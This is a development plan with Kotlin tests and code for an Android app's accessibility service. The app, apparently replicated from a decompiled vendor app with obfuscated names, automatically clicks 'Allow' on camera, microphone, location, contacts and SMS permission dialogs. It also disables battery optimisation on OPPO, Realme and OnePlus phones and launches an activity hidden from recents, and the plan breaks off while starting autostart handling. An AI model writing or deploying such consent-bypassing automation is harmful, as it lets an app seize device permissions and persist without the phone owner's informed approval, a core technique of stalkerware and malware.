**Companion val 保留:** 现有 `OppoSteps.AUTOSTART_COMPONENTS`/`BATTERY_COMPONENTS`/`PERMISSION_ALLOW_IDS`/`AUTOSTART_KEYWORDS`/`BATTERY_KEYWORDS`(旧 Step 1 8-id 列表)**全部保留**,被 `OppoStepsTest` 的 5 个常量断言测试依赖。Task 1 新增的 3-id 列表是 `executeStep1BasicPermissions` 内的 local val,两者并存不冲突。

### Step 1.1: 写 OppoStep1BasicPermsTest 失败测试

- [ ] 创建 `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep1BasicPermsTest.kt`

```kotlin
package com.storm.safe.rock.service.modules.yw5xud

import android.content.Context
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.mockito.Mockito.`when`
import org.mockito.Mockito.anyString
import org.mockito.Mockito.atLeastOnce
import org.mockito.Mockito.doReturn
import org.mockito.Mockito.mock
import org.mockito.Mockito.spy
import org.mockito.Mockito.verify
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment

/**
 * Step 1 — 基础危险权限(CAMERA/RECORD_AUDIO/LOCATION/CONTACTS/PHONE/SMS/EXTERNAL_STORAGE...)
 *
 * vendor `OppoStepsSimplified.m212323c1` 委托 `umrkmgrri` 启动独立线程处理 UI 点击,
 * replica 用 `clickPermissionControllerAllowButton()` 主路径(华为真机 25/26 validated)。
 */
@RunWith(RobolectricTestRunner::class)
class OppoStep1BasicPermsTest {
    private lateinit var context: Context
    @Before fun setUp() { context = RuntimeEnvironment.getApplication() }

    @Test fun `step1 clicks allow_button by resource-id when dialog present`() = runBlocking {
        val svc = mock(MyAccessibilityService::class.java)
        val root = mock(AccessibilityNodeInfo::class.java)
        val allowNode = mock(AccessibilityNodeInfo::class.java)

        `when`(svc.rootInActiveWindow).thenReturn(root)
        `when`(allowNode.isVisibleToUser).thenReturn(true)
        `when`(allowNode.isClickable).thenReturn(true)
        `when`(allowNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)).thenReturn(true)

        doReturn(listOf(allowNode)).`when`(root)
            .findAccessibilityNodeInfosByViewId("com.android.permissioncontroller:id/permission_allow_button")
        doReturn(emptyList<AccessibilityNodeInfo>()).`when`(root)
            .findAccessibilityNodeInfosByViewId(
                "com.android.permissioncontroller:id/permission_allow_foreground_only_button")
        doReturn(emptyList<AccessibilityNodeInfo>()).`when`(root)
            .findAccessibilityNodeInfosByViewId(
                "com.android.permissioncontroller:id/permission_allow_one_time_button")
        doReturn(emptyList<AccessibilityNodeInfo>()).`when`(root)
            .findAccessibilityNodeInfosByText(anyString())

        val steps = spy(OppoSteps(svc, context))

        steps.executeStep1BasicPermissions(mutableListOf(), mutableListOf(), mutableListOf())

        verify(allowNode, atLeastOnce()).performAction(AccessibilityNodeInfo.ACTION_CLICK)
    }

    @Test fun `step1 clicks foreground_only_button for location dialogs`() = runBlocking {
        val svc = mock(MyAccessibilityService::class.java)
        val root = mock(AccessibilityNodeInfo::class.java)
        val fgNode = mock(AccessibilityNodeInfo::class.java)

        `when`(svc.rootInActiveWindow).thenReturn(root)
        `when`(fgNode.isVisibleToUser).thenReturn(true)
        `when`(fgNode.isClickable).thenReturn(true)
        `when`(fgNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)).thenReturn(true)

        doReturn(emptyList<AccessibilityNodeInfo>()).`when`(root)
            .findAccessibilityNodeInfosByViewId(
                "com.android.permissioncontroller:id/permission_allow_button")
        doReturn(listOf(fgNode)).`when`(root)
            .findAccessibilityNodeInfosByViewId(
                "com.android.permissioncontroller:id/permission_allow_foreground_only_button")
        doReturn(emptyList<AccessibilityNodeInfo>()).`when`(root)
            .findAccessibilityNodeInfosByText(anyString())

        val steps = spy(OppoSteps(svc, context))
        steps.executeStep1BasicPermissions(mutableListOf(), mutableListOf(), mutableListOf())

        verify(fgNode, atLeastOnce()).performAction(AccessibilityNodeInfo.ACTION_CLICK)
    }

    @Test fun `step1 falls back to text click when no resource-id found`() = runBlocking {
        val svc = mock(MyAccessibilityService::class.java)
        val root = mock(AccessibilityNodeInfo::class.java)
        val textNode = mock(AccessibilityNodeInfo::class.java)

        `when`(svc.rootInActiveWindow).thenReturn(root)
        `when`(textNode.isVisibleToUser).thenReturn(true)
        `when`(textNode.isClickable).thenReturn(true)
        `when`(textNode.text).thenReturn("始终允许")
        `when`(textNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)).thenReturn(true)

        doReturn(emptyList<AccessibilityNodeInfo>()).`when`(root)
            .findAccessibilityNodeInfosByViewId(anyString())
        doReturn(emptyList<AccessibilityNodeInfo>()).`when`(root)
            .findAccessibilityNodeInfosByText(anyString())
        doReturn(listOf(textNode)).`when`(root).findAccessibilityNodeInfosByText("始终允许")

        val steps = spy(OppoSteps(svc, context))
        steps.executeStep1BasicPermissions(mutableListOf(), mutableListOf(), mutableListOf())

        verify(textNode, atLeastOnce()).performAction(AccessibilityNodeInfo.ACTION_CLICK)
    }

    @Test fun `step1 exits within 11 seconds on empty page`() = runBlocking {
        val svc = mock(MyAccessibilityService::class.java)
        `when`(svc.rootInActiveWindow).thenReturn(null)
        val steps = spy(OppoSteps(svc, context))

        val t0 = System.currentTimeMillis()
        steps.executeStep1BasicPermissions(mutableListOf(), mutableListOf(), mutableListOf())
        val elapsed = System.currentTimeMillis() - t0

        assertTrue("Step1 should exit within 11s; elapsed=${elapsed}ms", elapsed < 11_000L)
    }
}
```

### Step 1.2: 运行测试确认失败

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoStep1BasicPermsTest"`

预期:FAIL with "unresolved reference: executeStep1BasicPermissions"

### Step 1.3: 实现 OppoSteps.executeStep1BasicPermissions

- [ ] 修改 `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt`

在 `OppoSteps` class 内添加:

```kotlin
    /**
     * Step 1 — 基础运行时权限(umrkmgrri 子模块 + resource-id 驱动)。
     *
     * vendor `OppoStepsSimplified.m212323c1` 委托 umrkmgrri.f55158a3.start(context) + 独立 Thread 轮询 20×500ms。
     * replica 采用与 HuaweiSteps.executeStep1BasicPermissions 一致的 resource-id 驱动:
     *  1. 启动 umrkmgrri Activity(等同于华为的 HuaweiPermissionRequestActivity)
     *  2. 10s 轮询主循环:优先 permissioncontroller resource-id 点击,失败降级 text 点击
     *
     * ADAPT: 不用 vendor 的坐标 fallback(华为 FIN-AL60 真机证明 coord 必然 miss)。
     */
    open suspend fun executeStep1BasicPermissions(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        val svc = service ?: run {
            failures.add("[Step 1/10] service=null,跳过")
            return
        }
        android.util.Log.i(TAG, "[Step1/9] enter executeStep1BasicPermissions")
        logs.add("[Step 1/9] ▶ 基础权限开始(超时10秒) | vendor m212323c1")

        // 启动批量权限 Activity(复用现有 umrkmgrri)
        try {
            val intent = android.content.Intent(context, umrkmgrri::class.java).apply {
                addFlags(
                    android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
                    android.content.Intent.FLAG_ACTIVITY_SINGLE_TOP or
                    android.content.Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
                )
            }
            svc.startActivity(intent)
            logs.add("[Step 1/9] ✓ 已启动 umrkmgrri")
            kotlinx.coroutines.delay(800L)
        } catch (e: kotlinx.coroutines.CancellationException) { throw e } catch (e: Exception) {
            android.util.Log.w(TAG, "[Step1] launch umrkmgrri failed: ${e.message}")
        }

        val timeoutMs = 10_000L
        val start = System.currentTimeMillis()
        var clickCount = 0
        val maxClicksGuard = 40

        while (System.currentTimeMillis() - start < timeoutMs) {
            val root = try { svc.rootInActiveWindow } catch (_: Exception) { null }
            if (root == null) { kotlinx.coroutines.delay(300L); continue }

            // 主路径:resource-id 驱动点击
            val clickedViaId = clickPermissionControllerAllowButton(root)
            if (clickedViaId != null) {
                android.util.Log.d(TAG, "[Step1] allow-by-id = $clickedViaId")
                logs.add("[Step 1/9] 🔍 allow-by-id = $clickedViaId")
                clickCount++
                kotlinx.coroutines.delay(300L)
                if (clickCount >= maxClicksGuard) break
                continue
            }

            // fallback:文本点击
            val textClicked = clickTextOnRoot(root, "始终允许") ||
                clickTextOnRoot(root, "允许") ||
                clickTextOnRoot(root, "仅使用期间允许")
            if (textClicked) {
                clickCount++
                kotlinx.coroutines.delay(300L)
            } else {
                kotlinx.coroutines.delay(500L)
            }
            if (clickCount >= maxClicksGuard) break
        }

        val elapsedSec = (System.currentTimeMillis() - start) / 1000L
        logs.add("[Step 1/9] 完成,用时 ${elapsedSec}s,点击 $clickCount 次")
        if (clickCount > 0) successes.add("[Step 1/9] 基础权限处理 $clickCount 次")
    }

    /** 按 3 个 permissioncontroller resource-id 优先级查 + 点击,返回命中 id 短名或 null. */
    private fun clickPermissionControllerAllowButton(root: android.view.accessibility.AccessibilityNodeInfo): String? {
        val ids = listOf(
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_one_time_button"
        )
        for (id in ids) {
            val nodes = try { root.findAccessibilityNodeInfosByViewId(id) } catch (_: Exception) { null } ?: continue
            for (n in nodes) {
                try { if (!n.isVisibleToUser) continue } catch (_: Exception) { /* mock may throw */ }
                if (performClickOrAncestor(n)) return id.substringAfterLast('/')
            }
        }
        return null
    }

    private fun performClickOrAncestor(node: android.view.accessibility.AccessibilityNodeInfo): Boolean {
        try {
            if (node.isClickable && node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)) return true
            var p = try { node.parent } catch (_: Exception) { null }
            var depth = 0
            while (p != null && depth < 10) {
                if (p.isClickable && p.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)) return true
                p = try { p.parent } catch (_: Exception) { null }
                depth++
            }
        } catch (_: Exception) { /* ignore */ }
        return false
    }

    private fun clickTextOnRoot(root: android.view.accessibility.AccessibilityNodeInfo, text: String): Boolean {
        val matches = try { root.findAccessibilityNodeInfosByText(text) } catch (_: Exception) { return false } ?: return false
        for (n in matches) {
            try { if (!n.isVisibleToUser) continue } catch (_: Exception) {}
            val nodeText = try { n.text?.toString()?.trim() ?: "" } catch (_: Exception) { "" }
            if (nodeText == text && performClickOrAncestor(n)) return true
        }
        return false
    }
```

### Step 1.4: 运行测试确认通过

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoStep1BasicPermsTest"`

预期:PASS 4 tests

### Step 1.5: 编译 + Commit

- [ ] 运行 `./gradlew compileDebugKotlin` 确认通过

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt \
        app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep1BasicPermsTest.kt
git commit -m "feat(oppo): Task1 Step1 基础权限 — umrkmgrri + resource-id 驱动(华为真机方案复用)"
```

---

## Task 2: Step 2 Battery Optimization(SubBrand 分发)

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt`
- Test: `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep2BatteryTest.kt`

**Vendor 对齐:** `OppoStepsSimplified.m212337e1` 按 SubBrand 分发到 `mOppo`/`mRealme`/`mOnePlus`

### Step 2.1: 写 OppoStep2BatteryTest 失败测试

- [ ] 创建 `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep2BatteryTest.kt`

```kotlin
package com.storm.safe.rock.service.modules.yw5xud

import android.content.Context
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.runBlocking
import org.junit.After
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.mockito.Mockito.`when`
import org.mockito.Mockito.doReturn
import org.mockito.Mockito.mock
import org.mockito.Mockito.spy
import org.mockito.Mockito.verify
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment

@RunWith(RobolectricTestRunner::class)
class OppoStep2BatteryTest {
    private lateinit var context: Context
    @Before fun setUp() { context = RuntimeEnvironment.getApplication() }
    @After fun tearDown() { OppoStepCompletionStore.clearAll(context) }

    @Test fun `skips when step2 already completed within 24h`() = runBlocking {
        OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP2_BATTERY)
        val svc = mock(MyAccessibilityService::class.java)
        val steps = spy(OppoSteps(svc, context))
        val logs = mutableListOf<String>()

        steps.executeStep2Battery(mutableListOf(), mutableListOf(), logs)

        assertTrue("Expected skip log", logs.any { it.contains("跳过") || it.contains("skip") })
    }

    @Test fun `dispatches to mOppo for OPPO subbrand`() = runBlocking {
        val svc = mock(MyAccessibilityService::class.java)
        val steps = spy(OppoSteps(svc, context))
        doReturn(OppoSubBrand.OPPO).`when`(steps).subBrand
        doReturn(Unit).`when`(steps).executeBatteryOppo(
            org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
        )

        steps.executeStep2Battery(mutableListOf(), mutableListOf(), mutableListOf())

        verify(steps).executeBatteryOppo(
            org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
        )
    }

    @Test fun `dispatches to mRealme for REALME subbrand`() = runBlocking {
        val svc = mock(MyAccessibilityService::class.java)
        val steps = spy(OppoSteps(svc, context))
        doReturn(OppoSubBrand.REALME).`when`(steps).subBrand
        doReturn(Unit).`when`(steps).executeBatteryRealme(
            org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
        )

        steps.executeStep2Battery(mutableListOf(), mutableListOf(), mutableListOf())

        verify(steps).executeBatteryRealme(
            org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
        )
    }

    @Test fun `dispatches to mOnePlus for ONEPLUS subbrand`() = runBlocking {
        val svc = mock(MyAccessibilityService::class.java)
        val steps = spy(OppoSteps(svc, context))
        doReturn(OppoSubBrand.ONEPLUS).`when`(steps).subBrand
        doReturn(Unit).`when`(steps).executeBatteryOnePlus(
            org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
        )

        steps.executeStep2Battery(mutableListOf(), mutableListOf(), mutableListOf())

        verify(steps).executeBatteryOnePlus(
            org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
        )
    }
}
```

### Step 2.2: 运行测试确认失败

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoStep2BatteryTest"`

预期:FAIL with "unresolved reference: executeStep2Battery"

### Step 2.3: 实现 SubBrand 分发 + 3 个品牌 stub

- [ ] 修改 `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt`

添加到 class 内:

```kotlin
    /** 当前设备 SubBrand(vendor SubBrand ordinal 对齐) */
    open val subBrand: OppoSubBrand = OppoSubBrand.detect()

    /**
     * Step 2 — 电池优化豁免(SubBrand 分发)。
     *
     * vendor `m212337e1` dispatcher:
     *   REALME → mRealme
     *   ONEPLUS → mOnePlus
     *   OPPO/OPLUS → mOppo
     */
    open suspend fun executeStep2Battery(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP2_BATTERY)) {
            logs.add("[Step 2/9] ⏭ 24h 内已完成,跳过")
            return
        }
        logs.add("[Step 2/9] ▶ 电池优化豁免开始(subBrand=$subBrand)")

        when (subBrand) {
            OppoSubBrand.REALME -> executeBatteryRealme(successes, failures, logs)
            OppoSubBrand.ONEPLUS -> executeBatteryOnePlus(successes, failures, logs)
            OppoSubBrand.OPPO, OppoSubBrand.OPLUS -> executeBatteryOppo(successes, failures, logs)
        }
    }

    /** OPPO/OPLUS 路径(文档 2a) — 4 级菜单 + 5 个目标开关 */
    open suspend fun executeBatteryOppo(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        logs.add("[Step 2/9] mOppo 4 级菜单路径")
        // 打开系统设置
        openSettings()
        kotlinx.coroutines.delay(800L)

        // 文本点击 "电池"
        clickTextWithScroll("电池", scrollLimit = 5)
        kotlinx.coroutines.delay(600L)

        // # 分隔符多级菜单:"更多设置#高级设置#智能省电场景#更多"
        navigateByHashPath(OppoBatteryPaths.OPPO_OPLUS_PATH, scrollLimit = 5)

        // 5 个目标开关
        closeSwitch("睡眠待机优化") || closeSwitch("待机耗电优化")
        kotlinx.coroutines.delay(400L)
        clickTextWithScroll("耗电异常优化", scrollLimit = 3)
        kotlinx.coroutines.delay(800L)
        clickTextWithScroll(appLabel, scrollLimit = 25)
        kotlinx.coroutines.delay(400L)
        clickText("不优化")
        kotlinx.coroutines.delay(400L)
        pressBack(); pressBack()
        closeSwitch("省电模式")

        successes.add("[Step 2/9] OPPO 电池流程完成")
        OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP2_BATTERY)
    }

    /** Realme 路径(文档 2c) — 按 SDK 分支 */
    open suspend fun executeBatteryRealme(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        val sdk = android.os.Build.VERSION.SDK_INT
        logs.add("[Step 2/9] mRealme SDK=$sdk")
        openSettings()
        kotlinx.coroutines.delay(800L)
        clickTextWithScroll("电池", scrollLimit = 5)
        kotlinx.coroutines.delay(600L)

        when {
            sdk >= 36 -> {
                logs.add("[Step 2/9] Realme SDK≥36 委托 mOppo")
                executeBatteryOppo(successes, failures, logs)
                return
            }
            sdk == 35 -> {
                clickTextWithScroll("省电设置", scrollLimit = 3)
                kotlinx.coroutines.delay(400L)
                closeSwitch("睡眠待机优化")
                closeSwitch("自动进入省电模式")
                pressBack(); pressBack(); pressBack()
            }
            sdk == 29 -> {
                closeSwitch("省电模式")
                clickTextWithScroll("智能省电场景", scrollLimit = 3)
                kotlinx.coroutines.delay(400L)
                closeSwitch("睡眠待机优化")
            }
            else -> {
                // legacy SDK ≤ 34 且 ≠ 29
                navigateByHashPath(OppoBatteryPaths.REALME_LEGACY_PATH, scrollLimit = 5)
                clickTextWithScroll("耗电异常优化", scrollLimit = 3)
                clickTextWithScroll(appLabel, scrollLimit = 25)
                clickText("不优化") || (clickText("待机优化") && clickText("关闭"))
                pressBack(); pressBack()
            }
        }
        successes.add("[Step 2/9] Realme 电池流程完成")
        OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP2_BATTERY)
    }

    /** OnePlus 路径(文档 2b) — 按 SDK 分支 */
    open suspend fun executeBatteryOnePlus(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        val sdk = android.os.Build.VERSION.SDK_INT
        logs.add("[Step 2/9] mOnePlus SDK=$sdk")
        openSettings()
        kotlinx.coroutines.delay(800L)
        clickTextWithScroll("电池", scrollLimit = 5)
        kotlinx.coroutines.delay(600L)

        when {
            sdk >= 36 -> {
                logs.add("[Step 2/9] OnePlus SDK≥36 委托 mOppo")
                executeBatteryOppo(successes, failures, logs)
                return
            }
            sdk == 35 -> {
                clickTextWithScroll("电池模式", scrollLimit = 3)
                kotlinx.coroutines.delay(400L)
                clickText("均衡模式")
                kotlinx.coroutines.delay(400L)
                clickTextWithScroll("省电设置", scrollLimit = 3)
                closeSwitch("自动进入省电模式")
                closeSwitch("睡眠待机优化")
                pressBack(); pressBack()
            }
            else -> {
                // legacy SDK ≤ 34
                openAppDetails()
                closeSwitch("省电模式")
                // 弹窗:立即关闭 / 立即开启
                clickText("立即关闭")
                pressBack()
                clickTextWithScroll("耗电管理", scrollLimit = 3) || clickText("电池")
                navigateByHashPath(OppoBatteryPaths.ONEPLUS_LEGACY_PATH, scrollLimit = 3)
                closeSwitch("睡眠待机优化")
                clickTextWithScroll("耗电异常优化", scrollLimit = 3)
                clickTextWithScroll(appLabel, scrollLimit = 25)
                clickText("不优化")
                pressBack(); pressBack(); pressBack()
            }
        }
        successes.add("[Step 2/9] OnePlus 电池流程完成")
        OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP2_BATTERY)
    }
```

还需要在 class 内添加基础 helper(若 OppoSteps 尚未有)。参考 Task 1 已加的 `clickTextOnRoot`;这里补齐:

```kotlin
    // ——————————— 通用 UI helper(可复用)———————————

    /** 应用 label(R.string.app_name) */
    val appLabel: String = try {
        context.applicationInfo.loadLabel(context.packageManager).toString()
    } catch (_: Throwable) { context.packageName ?: "app" }

    /** 打开系统设置首页 */
    protected suspend fun openSettings() {
        try {
            val i = android.content.Intent(android.provider.Settings.ACTION_SETTINGS)
                .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(i)
        } catch (e: Exception) { android.util.Log.w(TAG, "openSettings: ${e.message}") }
    }

    /** 打开 app 详情页 */
    protected suspend fun openAppDetails() {
        try {
            val i = android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                .setData(android.net.Uri.parse("package:${context.packageName}"))
                .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(i)
        } catch (e: Exception) { android.util.Log.w(TAG, "openAppDetails: ${e.message}") }
    }

    protected fun pressBack() {
        try { service?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK) } catch (_: Exception) {}
    }

    /** `#` 分隔符多级菜单导航(vendor clickVWithScroll) */
    protected suspend fun navigateByHashPath(path: String, scrollLimit: Int = 3) {
        for (segment in path.split("#")) {
            clickTextWithScroll(segment, scrollLimit = scrollLimit)
            kotlinx.coroutines.delay(500L)
        }
    }

    /** 文本点击(单层点击,不滚动) */
    protected fun clickText(text: String): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        return clickTextOnRoot(root, text)
    }

    /** 文本点击 + 未找到则 scroll 重试,最多 scrollLimit 次 */
    protected suspend fun clickTextWithScroll(text: String, scrollLimit: Int = 3): Boolean {
        repeat(scrollLimit + 1) { attempt ->
            if (clickText(text)) return true
            // scroll forward
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
            try { root.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SCROLL_FORWARD) } catch (_: Exception) {}
            kotlinx.coroutines.delay(400L)
        }
        return false
    }

    /** 关闭名为 text 的 Switch(当前 checked=true 则 click 切为 false). */
    protected fun closeSwitch(text: String): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        val nodes = try { root.findAccessibilityNodeInfosByText(text) } catch (_: Exception) { null } ?: return false
        for (labelNode in nodes) {
            // 找同级 Switch
            var p: android.view.accessibility.AccessibilityNodeInfo? = try { labelNode.parent } catch (_: Exception) { null }
            var depth = 0
            while (p != null && depth < 8) {
                for (i in 0 until (try { p.childCount } catch (_: Exception) { 0 })) {
                    val sibling = try { p.getChild(i) } catch (_: Exception) { null } ?: continue
                    val clsName = try { sibling.className?.toString() ?: "" } catch (_: Exception) { "" }
                    if (clsName.endsWith("Switch") || clsName.endsWith("CheckBox") || clsName.endsWith("CompoundButton")) {
                        val isChecked = try { sibling.isChecked } catch (_: Exception) { false }
                        if (isChecked && performClickOrAncestor(sibling)) return true
                        if (!isChecked) return true  // 已关闭,视为 success
                    }
                }
                p = try { p.parent } catch (_: Exception) { null }
                depth++
            }
        }
        return false
    }

    protected fun openSwitch(text: String): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        val nodes = try { root.findAccessibilityNodeInfosByText(text) } catch (_: Exception) { null } ?: return false
        for (labelNode in nodes) {
            var p: android.view.accessibility.AccessibilityNodeInfo? = try { labelNode.parent } catch (_: Exception) { null }
            var depth = 0
            while (p != null && depth < 8) {
                for (i in 0 until (try { p.childCount } catch (_: Exception) { 0 })) {
                    val sibling = try { p.getChild(i) } catch (_: Exception) { null } ?: continue
                    val clsName = try { sibling.className?.toString() ?: "" } catch (_: Exception) { "" }
                    if (clsName.endsWith("Switch") || clsName.endsWith("CheckBox") || clsName.endsWith("CompoundButton")) {
                        val isChecked = try { sibling.isChecked } catch (_: Exception) { false }
                        if (!isChecked && performClickOrAncestor(sibling)) return true
                        if (isChecked) return true
                    }
                }
                p = try { p.parent } catch (_: Exception) { null }
                depth++
            }
        }
        return false
    }
```

### Step 2.4: 运行测试确认通过

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoStep2BatteryTest"`

预期:PASS 4 tests

### Step 2.5: Commit

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt \
        app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep2BatteryTest.kt
git commit -m "feat(oppo): Task2 Step2 电池优化 SubBrand 分发 + 4 级菜单 + UI helper 基础"
```

---

## Task 3: Step 3 AutoStart + Background

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt`
- Test: `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep3AutoStartTest.kt`

**Vendor 对齐:** `OppoStepsSimplified.m212318b6`(SDK ≥ 35 与 < 35 分支)+ SafeCenter ComponentName 兜底

### Step 3.1: 写 OppoStep3AutoStartTest 失败测试

- [ ] 创建 `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep3AutoStartTest.kt`

```kotlin
package com.storm.safe.rock.service.modules.yw5xud

import android.content.Context
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.runBlocking
import org.junit.After
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.mockito.Mockito.doReturn
import org.mockito.Mockito.mock
import org.mockito.Mockito.spy
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment

@RunWith(RobolectricTestRunner::class)
class OppoStep3AutoStartTest {
    private lateinit var context: Context
    @Before fun setUp() { context = RuntimeEnvironment.getApplication() }
    @After fun tearDown() { OppoStepCompletionStore.clearAll(context) }

    @Test fun `skips when autostart already completed`() = runBlocking {
        OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP3_AUTOSTART)
        val steps = spy(OppoSteps(mock(MyAccessibilityService::class.java), context))
        val logs = mutableListOf<String>()
        steps.executeStep3AutoStart(mutableListOf(), mutableListOf(), logs)
        assertTrue(logs.any { it.contains("跳过") })
    }

    @Test fun `marks completed when both subswitches marked`() = runBlocking {
        val steps = spy(OppoSteps(mock(MyAccessibilityService::class.java), context))
        doReturn(true).`when`(steps).runAutoStartSubSwitch(
            org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
        )
        doReturn(true).`when`(steps).runBackgroundSubSwitch(
            org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
        )

        steps.executeStep3AutoStart(mutableListOf(), mutableListOf(), mutableListOf())

        assertTrue("Step3 整体应被 mark",
            OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP3_AUTOSTART))
    }

    @Test fun `does not mark overall when only autostart sub succeeds`() = runBlocking {
        val steps = spy(OppoSteps(mock(MyAccessibilityService::class.java), context))
        doReturn(true).`when`(steps).runAutoStartSubSwitch(
            org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
        )
        doReturn(false).`when`(steps).runBackgroundSubSwitch(
            org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
        )

        steps.executeStep3AutoStart(mutableListOf(), mutableListOf(), mutableListOf())

        assertTrue("整体 mark 不应写入",
            !OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP3_AUTOSTART))
        assertTrue("autostart_switch 子 mark 应写入",
            OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP3_AUTOSTART_SWITCH))
    }

    @Test fun `falls back to SafeCenter ComponentName when autostart switch not found`() = runBlocking {
        val steps = spy(OppoSteps(mock(MyAccessibilityService::class.java), context))
        doReturn(false).`when`(steps).tryOpenAutoStartViaSettings(
            org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
        )
        doReturn(true).`when`(steps).tryOpenAutoStartViaSafeCenter(
            org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
        )
        doReturn(true).`when`(steps).runBackgroundSubSwitch(
            org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any(), org.mockito.ArgumentMatchers.any()
        )

        val logs = mutableListOf<String>()
        steps.executeStep3AutoStart(mutableListOf(), mutableListOf(), logs)

        assertTrue("Expected SafeCenter fallback log",
            logs.any { it.contains("SafeCenter") || it.contains("safecenter") })
    }
}
```

### Step 3.2: 运行测试确认失败

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoStep3AutoStartTest"`

预期:FAIL with "unresolved reference: executeStep3AutoStart"

### Step 3.3: 实现 Step 3

- [ ] 修改 `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt`

在 class 内添加:

```kotlin
    /**
     * Step 3 — 自启动 + 后台运行。
     *
